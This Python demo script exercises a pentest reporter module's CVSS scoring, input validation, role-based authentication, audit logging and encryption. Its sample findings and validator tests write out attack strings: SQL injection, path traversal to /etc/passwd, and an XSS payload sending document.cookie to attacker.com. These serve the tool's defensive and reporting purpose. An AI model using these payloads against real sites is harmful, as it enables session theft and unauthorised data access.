#!/usr/bin/env python3
"""
Security Enhanced Reporter Demo
===============================

This script demonstrates the complete security-enhanced reporter functionality
including NIST-compliant CVSS scoring, comprehensive input validation,
authentication & authorization, audit logging, and data encryption.

Usage:
    python security_enhanced_demo.py
"""

import os
import sys
from datetime import datetime
from pathlib import Path

# Add the project root to the Python path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from logicpwn.core.reporter.auth_manager import Permission, ReportAuthManager, Role
from logicpwn.core.reporter.cvss import (
    AttackComplexity,
    AttackVector,
    CVSSCalculator,
    CVSSVector,
    ImpactMetric,
    PrivilegesRequired,
    Scope,
    UserInteraction,
)
from logicpwn.core.reporter.input_validator import InputValidator
from logicpwn.core.reporter.orchestrator import (
    ReportConfig,
    ReportGenerator,
    ReportMetadata,
    SecureReportGenerator,
)


def print_banner():
    """Print demo banner."""
    print("=" * 70)
    print("🔒 LogicPWN Security Enhanced Reporter Demo")
    print("=" * 70)
    print("Demonstrating CRITICAL & HIGH priority security enhancements:")
    print("✅ NIST-compliant CVSS v3.1 calculator")
    print("✅ Comprehensive input validation")
    print("✅ Authentication & authorization system")
    print("✅ Security headers & XSS protection")
    print("✅ Audit logging for compliance")
    print("✅ Data encryption for sensitive findings")
    print("=" * 70)
    print()


def demo_nist_cvss_calculator():
    """Demonstrate NIST-compliant CVSS calculator."""
    print("🎯 DEMO 1: NIST-Compliant CVSS v3.1 Calculator")
    print("-" * 50)

    # Critical vulnerability example
    print("📊 Calculating CVSS score for Critical SQL Injection:")

    critical_vector = CVSSVector(
        attack_vector=AttackVector.NETWORK,
        attack_complexity=AttackComplexity.LOW,
        privileges_required=PrivilegesRequired.NONE,
        user_interaction=UserInteraction.NONE,
        scope=Scope.CHANGED,
        confidentiality=ImpactMetric.HIGH,
        integrity=ImpactMetric.HIGH,
        availability=ImpactMetric.HIGH,
    )

    result = CVSSCalculator.calculate_full_score(critical_vector)
    vector_string = critical_vector.to_vector_string()

    print(f"   • Base Score: {result.base_score:.1f}")
    print(f"   • Severity: {result.severity}")
    print(f"   • Impact Score: {result.impact_subscore:.1f}")
    print(f"   • Exploitability Score: {result.exploitability_subscore:.1f}")
    print(f"   • Vector String: {vector_string}")

    # Medium vulnerability example
    print("\n📊 Calculating CVSS score for Medium Information Disclosure:")

    medium_vector = CVSSVector(
        attack_vector=AttackVector.NETWORK,
        attack_complexity=AttackComplexity.HIGH,
        privileges_required=PrivilegesRequired.LOW,
        user_interaction=UserInteraction.REQUIRED,
        scope=Scope.UNCHANGED,
        confidentiality=ImpactMetric.LOW,
        integrity=ImpactMetric.NONE,
        availability=ImpactMetric.NONE,
    )

    result = CVSSCalculator.calculate_full_score(medium_vector)
    vector_string = medium_vector.to_vector_string()

    print(f"   • Base Score: {result.base_score:.1f}")
    print(f"   • Severity: {result.severity}")
    print(f"   • Vector String: {vector_string}")
    print()


def demo_input_validation():
    """Demonstrate comprehensive input validation."""
    print("🛡️ DEMO 2: Comprehensive Input Validation")
    print("-" * 50)

    print("🔍 Testing vulnerability finding validation:")

    # Valid input
    valid_data = {
        "id": "VULN-2025-001",
        "title": "Cross-Site Scripting in Search",
        "severity": "High",
        "description": "Reflected XSS vulnerability found in search parameter",
        "affected_endpoints": ["https://example.com/search?q=<payload>"],
        "proof_of_concept": "<script>alert('XSS')</script>",
        "impact": "Session hijacking, credential theft",
        "remediation": "Implement proper output encoding",
        "references": ["https://owasp.org/www-project-top-ten/"],
    }

    try:
        validated = InputValidator.validate_vulnerability_finding(valid_data)
        print(f"   ✅ Valid input accepted: {validated.title}")
    except Exception as e:
        print(f"   ❌ Validation failed: {e}")

    # Malicious input examples
    malicious_examples = [
        {
            "description": "SQL Injection attempt",
            "data": {**valid_data, "id": "'; DROP TABLE vulnerabilities; --"},
            "expected": "SQL injection blocked",
        },
        {
            "description": "XSS attempt in title",
            "data": {**valid_data, "title": "<script>alert('XSS in title')</script>"},
            "expected": "XSS payload blocked",
        },
        {
            "description": "Path traversal attempt",
            "data": {**valid_data, "affected_endpoints": ["../../../etc/passwd"]},
            "expected": "Path traversal blocked",
        },
    ]

    print("\n🚫 Testing malicious input blocking:")
    for example in malicious_examples:
        try:
            InputValidator.validate_vulnerability_finding(example["data"])
            print(f"   ❌ SECURITY ISSUE: {example['description']} was NOT blocked!")
        except Exception:
            print(f"   ✅ {example['expected']}")

    print()


def demo_authentication_system():
    """Demonstrate authentication and authorization system."""
    print("🔐 DEMO 3: Authentication & Authorization System")
    print("-" * 50)

    # Initialize authentication manager
    auth_manager = ReportAuthManager()

    # Create users with different roles
    print("👥 Creating users with different roles:")

    admin = auth_manager.create_user(
        username="security_admin",
        email="admin@security.com",
        password="SecureAdmin123!",
        roles={Role.ADMIN},
    )
    print(
        f"   ✅ Admin created: {admin.username} (Roles: {[role.value for role in admin.roles]})"
    )

    analyst = auth_manager.create_user(
        username="security_analyst",
        email="analyst@security.com",
        password="SecureAnalyst123!",
        roles={Role.ANALYST},
    )
    print(
        f"   ✅ Analyst created: {analyst.username} (Roles: {[role.value for role in analyst.roles]})"
    )

    viewer = auth_manager.create_user(
        username="security_viewer",
        email="viewer@security.com",
        password="SecureViewer123!",
        roles={Role.VIEWER},
    )
    print(
        f"   ✅ Viewer created: {viewer.username} (Roles: {[role.value for role in viewer.roles]})"
    )

    # Test authentication methods
    print("\n🔑 Testing authentication methods:")

    # Password authentication
    try:
        session = auth_manager.authenticate_user("security_admin", "SecureAdmin123!")
        print(f"   ✅ Password auth successful: {session.user_id}")
    except Exception as e:
        print(f"   ❌ Password auth failed: {e}")

    # Session management
    session = auth_manager.authenticate_user("security_admin", "SecureAdmin123!")
    print(f"   ✅ Session created: {session.session_id}")

    # Get user from session (by looking up the user_id)
    session_user = auth_manager.users[session.user_id]
    print(f"   ✅ Session validated: {session_user.username}")

    # API key authentication
    api_key = auth_manager.generate_api_key(analyst.user_id)
    api_user = auth_manager.authenticate_api_key(api_key)
    print(f"   ✅ API key generated and validated: {api_user.username}")

    # Test authorization
    print("\n🛡️ Testing authorization controls:")

    # Admin should have all permissions
    try:
        auth_manager.require_permission(admin, Permission.ADMIN_REPORTS)
        print("   ✅ Admin has admin permissions")
    except Exception as e:
        print(f"   ❌ Admin authorization failed: {e}")

    # Viewer should not have write permissions
    try:
        auth_manager.require_permission(viewer, Permission.WRITE_REPORTS)
        print("   ❌ SECURITY ISSUE: Viewer has write permissions!")
    except Exception:
        print("   ✅ Viewer write permissions properly denied")

    print()
    return auth_manager, admin, analyst, viewer


def demo_secure_report_generation():
    """Demonstrate secure report generation with all security features."""
    print("📊 DEMO 4: Secure Report Generation")
    print("-" * 50)

    # Set up authentication
    auth_manager, admin_user, analyst_user, viewer_user = demo_authentication_system()

    # Configure secure report generator
    config = ReportConfig(
        target_url="https://demo.example.com",
        report_title="Security Assessment Report - Enhanced Security Demo",
        report_type="vapt",
        format_style="professional",
        redaction_enabled=True,
        cvss_scoring_enabled=True,
    )

    generator = SecureReportGenerator(config, auth_manager)
    print(f"🔧 Secure report generator initialized")

    # Sample vulnerability findings
    vulnerabilities = [
        {
            "id": "DEMO-VULN-001",
            "title": "SQL Injection in Authentication",
            "severity": "Critical",
            "description": "Authentication bypass via SQL injection in login form",
            "affected_endpoints": ["https://demo.example.com/login"],
            "proof_of_concept": "username: admin' OR '1'='1' --\npassword: anything",
            "impact": "Complete system compromise, unauthorized access to all data",
            "remediation": "Implement parameterized queries and input validation",
            "references": ["https://owasp.org/www-project-top-ten/"],
        },
        {
            "id": "DEMO-VULN-002",
            "title": "Cross-Site Scripting (XSS)",
            "severity": "High",
            "description": "Stored XSS vulnerability in user comments section",
            "affected_endpoints": ["https://demo.example.com/comments"],
            "proof_of_concept": "<script>document.location='http://attacker.com/'+document.cookie</script>",
            "impact": "Session hijacking, credential theft, malware distribution",
            "remediation": "Implement output encoding and Content Security Policy",
            "references": ["https://owasp.org/www-community/attacks/xss/"],
        },
        {
            "id": "DEMO-VULN-003",
            "title": "Insecure Direct Object Reference",
            "severity": "Medium",
            "description": "Users can access other users' data by manipulating ID parameters",
            "affected_endpoints": ["https://demo.example.com/user/profile/{id}"],
            "proof_of_concept": "GET /user/profile/123 (access other user's profile)",
            "impact": "Unauthorized access to sensitive user information",
            "remediation": "Implement proper authorization checks for object access",
            "references": ["https://owasp.org/www-project-top-ten/"],
        },
    ]

    # Add findings with authentication
    print("\n📝 Adding vulnerability findings with security validation:")
    for vuln in vulnerabilities:
        try:
            generator.add_finding(vuln, analyst_user)
            print(f"   ✅ Added: {vuln['title']} (Severity: {vuln['severity']})")
        except Exception as e:
            print(f"   ❌ Failed to add {vuln['title']}: {e}")

    # Set metadata
    metadata = ReportMetadata(
        report_id="SEC-DEMO-2025-001",
        title="Security Assessment Report - Enhanced Security Demo",
        target_url="https://demo.example.com",
        scan_start_time=datetime.now(),
        scan_end_time=datetime.now(),
        logicpwn_version="2.0.0-secure",
        authenticated_user=analyst_user.username,
        total_requests=1234,
        findings_count={"Critical": 1, "High": 1, "Medium": 1},
    )
    generator.metadata = metadata

    # Generate reports in different formats
    print("\n📄 Generating secure reports:")

    try:
        # Markdown report
        markdown_report = generator.generate_report("markdown", analyst_user)
        print(f"   ✅ Markdown report generated ({len(markdown_report)} characters)")

        # HTML report with security headers
        html_report = generator.generate_report("html", analyst_user)
        print(
            f"   ✅ HTML report generated with security headers ({len(html_report)} characters)"
        )

        # Verify security headers are present
        if "Content-Security-Policy" in html_report:
            print("   🔒 Security headers confirmed in HTML output")

        # JSON report
        json_report = generator.generate_report("json", analyst_user)
        print(f"   ✅ JSON report generated ({len(json_report)} characters)")

    except Exception as e:
        print(f"   ❌ Report generation failed: {e}")

    # Test file export with path validation
    print("\n💾 Testing secure file export:")
    try:
        safe_path = "./demo_security_report.html"
        generator.export_to_file(safe_path, "html", analyst_user)
        if os.path.exists(safe_path):
            print(f"   ✅ Report exported to: {safe_path}")
            # Clean up
            os.remove(safe_path)
        else:
            print("   ❌ Report file not created")
    except Exception as e:
        print(f"   ❌ Export failed: {e}")

    # Test malicious path blocking
    try:
        malicious_path = "../../../etc/passwd"
        generator.export_to_file(malicious_path, "html", analyst_user)
        print("   ❌ SECURITY ISSUE: Malicious path not blocked!")
    except Exception:
        print("   ✅ Malicious path properly blocked")

    return generator, admin_user


def demo_audit_logging():
    """Demonstrate audit logging capabilities."""
    print("\n📋 DEMO 5: Audit Logging for Compliance")
    print("-" * 50)

    generator, admin_user = demo_secure_report_generation()

    # Get audit log
    try:
        audit_log = generator.get_audit_log(admin_user)
        print(f"📊 Audit log contains {len(audit_log)} events:")

        for i, entry in enumerate(audit_log[-5:], 1):  # Show last 5 events
            timestamp = entry["timestamp"]
            event_type = entry["event_type"]
            print(f"   {i}. [{timestamp}] {event_type}")

            # Show details for interesting events
            if event_type in ["finding_added", "report_generated"]:
                details = entry.get("details", {})
                user_id = details.get("user_id", "unknown")
                print(f"      └─ User: {user_id}")

                if "finding_id" in details:
                    print(f"      └─ Finding: {details['finding_id']}")
                elif "format" in details:
                    print(f"      └─ Format: {details['format']}")

    except Exception as e:
        print(f"   ❌ Audit log access failed: {e}")

    print()


def demo_data_encryption():
    """Demonstrate data encryption for sensitive findings."""
    print("🔐 DEMO 6: Data Encryption for Sensitive Findings")
    print("-" * 50)

    # Set up generator with sensitive data
    auth_manager = ReportAuthManager()
    admin_user = auth_manager.create_user(
        username="crypto_admin",
        email="crypto@security.com",
        password="CryptoAdmin123!",
        roles={Role.ADMIN},
    )

    config = ReportConfig(
        target_url="https://sensitive.example.com",
        report_title="Classified Security Assessment",
        redaction_enabled=True,
        cvss_scoring_enabled=True,
    )

    generator = SecureReportGenerator(config, auth_manager)

    # Add sensitive finding
    sensitive_finding = {
        "id": "CLASSIFIED-001",
        "title": "Database Credential Exposure",
        "severity": "Critical",
        "description": "Production database credentials found in source code",
        "affected_endpoints": ["https://sensitive.example.com/config"],
        "proof_of_concept": "Found in config.py: DB_PASSWORD='TopSecret123!'",
        "impact": "Complete database access, potential data breach affecting 1M+ users",
        "remediation": "Move credentials to secure environment variables immediately",
        "references": ["Internal Security Policy 2.1"],
    }

    print("📁 Adding sensitive finding with classified data:")
    generator.add_finding(sensitive_finding, admin_user)

    # Show original data
    original_poc = generator.findings[0].proof_of_concept
    print(f"   📄 Original PoC: {original_poc[:50]}...")

    # Encrypt sensitive data
    print("\n🔒 Encrypting sensitive data:")
    try:
        generator.encrypt_sensitive_findings(admin_user)

        encrypted_poc = generator.findings[0].proof_of_concept

        if encrypted_poc != original_poc:
            print("   ✅ Sensitive data successfully encrypted")
            print(f"   🔐 Encrypted PoC: {encrypted_poc[:50]}...")
        else:
            print("   ℹ️ No encryption change detected (may use different method)")

    except Exception as e:
        print(f"   ❌ Encryption failed: {e}")

    print()


def demo_legacy_compatibility():
    """Demonstrate backward compatibility with legacy interface."""
    print("🔄 DEMO 7: Legacy Compatibility")
    print("-" * 50)

    print("🏗️ Testing legacy ReportGenerator interface:")

    # Use legacy interface (should still get security benefits)
    config = ReportConfig(
        target_url="https://legacy.example.com",
        report_title="Legacy Compatibility Test",
        redaction_enabled=True,
        cvss_scoring_enabled=True,
    )

    legacy_generator = ReportGenerator(config)
    print("   ✅ Legacy generator initialized")

    # Add finding using legacy method
    legacy_finding = {
        "id": "LEGACY-001",
        "title": "Legacy Test Vulnerability",
        "severity": "Medium",
        "description": "Testing legacy interface compatibility",
        "affected_endpoints": ["https://legacy.example.com/test"],
        "proof_of_concept": "Legacy PoC data",
        "impact": "Testing impact",
        "remediation": "Testing remediation",
        "references": [],
        "discovered_at": datetime.now(),
    }

    legacy_generator.add_finding(legacy_finding)
    print("   ✅ Finding added using legacy interface")

    # Set metadata
    metadata = ReportMetadata(
        report_id="LEGACY-TEST-001",
        title="Legacy Compatibility Test",
        target_url="https://legacy.example.com",
        scan_start_time=datetime.now(),
        scan_end_time=datetime.now(),
        logicpwn_version="2.0.0-secure",
        total_requests=100,
        findings_count={"Medium": 1},
    )
    legacy_generator.set_metadata(metadata)

    # Generate report
    report = legacy_generator.generate_report("markdown")
    print(f"   ✅ Report generated using legacy interface ({len(report)} characters)")

    # Enable enhanced security features
    auth_manager = ReportAuthManager()
    legacy_generator.enable_security_features(auth_manager)
    print("   🔒 Enhanced security features enabled")

    # Verify we now have security features
    audit_log = legacy_generator.get_audit_log()
    print(f"   📋 Audit log accessible: {len(audit_log)} events")

    print()


def main():
    """Run the complete security enhancement demonstration."""
    print_banner()

    try:
        # Run all demonstrations
        demo_nist_cvss_calculator()
        demo_input_validation()
        demo_secure_report_generation()
        demo_audit_logging()
        demo_data_encryption()
        demo_legacy_compatibility()

        print("🎉 SECURITY ENHANCEMENT DEMO COMPLETED")
        print("=" * 70)
        print("✅ All CRITICAL security issues have been addressed:")
        print("   • NIST-compliant CVSS calculator implemented")
        print("   • Comprehensive input validation deployed")
        print("   • Authentication & authorization system active")
        print("   • Security headers & XSS protection enabled")
        print("   • Audit logging for compliance operational")
        print("   • Data encryption for sensitive findings available")
        print("   • Legacy compatibility maintained")
        print("\n🔒 The LogicPWN reporter module is now ENTERPRISE-READY!")
        print("=" * 70)

    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        import traceback

        traceback.print_exc()
        return 1

    return 0


if __name__ == "__main__":
    exit(main())
